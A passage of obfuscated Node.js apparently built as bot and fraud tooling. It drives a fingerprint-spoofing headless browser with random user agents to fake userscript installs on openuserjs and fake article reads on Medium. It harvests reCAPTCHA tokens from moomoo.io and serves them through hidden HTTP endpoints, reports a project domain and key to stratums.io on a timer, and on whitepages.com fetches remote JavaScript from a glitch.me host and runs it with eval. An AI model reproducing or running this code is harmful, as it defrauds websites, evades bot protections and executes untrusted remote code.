      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x16) + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + W(0x7),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + V(0x19),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x8 * -0x3ca + 0xa43 + -0x263 * 0x11
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const X = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x173a * -0x1 + 0x8c3 + -0x1ffd * 0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k[X(0x10)];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1f27 + 0x176 + 0x71 * -0x49), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x16ab + 0x26c7 + 0xfb8 * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x73 * -0x47 + 0x2089 + -0xa4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x2b * -0x25 + -0xe * -0x231 + 0x1 * -0x1877; w < getRandomInt(0xade + 0x2550 * -0x1 + 0x1a73, 0x562 + 0x3 * 0x6b6 + -0x197f); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1a927 + 0x12 * 0x11fa + 0x66df * -0x5);
        }
      }();
    }, -0x13 * -0xa6 + -0x6af + -0x53f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const Z = b,
          Y = c;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + Y(0xc)],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })[Z(0x1b, '8dl]')](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x21 * 0x101 + -0xe4a + -0x2b1 * 0x7;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0x24fb + -0x87b * -0x1 + 0x1c80, 0x1d * 0xf + 0xbf + -0x3 * 0xc0)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5 * 0x217c + -0x1 * 0xc2cc + -0x10 * -0x909);
    }, -0x8dd * 0x1 + -0x29c * 0xd + 0x1 * 0x2b2d), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x64e * -0x3 + -0xad * -0x13 + 0x613;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x2377 + -0x1 * -0x3bd + -0x1b7c), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x3f6 + 0x1 * 0x1f67 + 0x337 * -0xb), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xa4a25 + 0x123d77 + -0x2e427 * -0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x41e * 0x2 + 0xd21 + 0x2ff * -0x7);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x454 + -0x13e5 + -0x1 * -0x1059);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x10 * -0x363 + 0x6 * -0x24f + -0x8c6);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = d;
  async function f() {
    const a1 = d,
      a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xb18 + -0x95b * 0x3 + 0x272a) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1d4c + 0x646 * -0x4 + 0x3665));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1d54 + -0x8ac + 0x2600, D['indexOf']('\x20'));
        return B ? E['slice'](0xb3 * 0x30 + -0x4a2 + -0x1cee, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3637 * 0x1 + -0x1911 + 0x7658),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': a0(0x6, 'YLJV'),
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x46d4 + -0xa * -0x97 + 0x36 * 0x1ed),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': a1(0x12) + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + a1(0x0),
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + a2(0x1) + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + a2(0x18) + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1951 * 0x1 + -0x1486 + 0x2dd7 * 0x1; k < 0x2 * -0xe0f + 0x213d + -0x51b; k++)
    setTimeout(f, (0x5b71 + 0x41b0 * 0x2 + 0x1 * 0xb8f) * k * getRandomInt(0x5 * 0x75a + -0x24ad + -0x14 * 0x1, 0x1 * 0x2055 + 0x60d + -0x265f * 0x1));
  setInterval(() => {
    f();
    for (let l = -0x1b20 + -0x15f3 + 0x11 * 0x2e3; l < 0x3a5 + -0x2144 + -0x9 * -0x34b; l++)
      setTimeout(f, (-0x2056 * -0x2 + 0x569e + 0x2 * 0x298b) * l * getRandomInt(-0x85 * 0x49 + -0xcd6 + -0xcb1 * -0x4, 0x1cf9 * 0x1 + 0xa7d * 0x3 + -0x3c6d));
  }, -0x12779 * -0x1c + -0x23699f + 0x3a06e3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
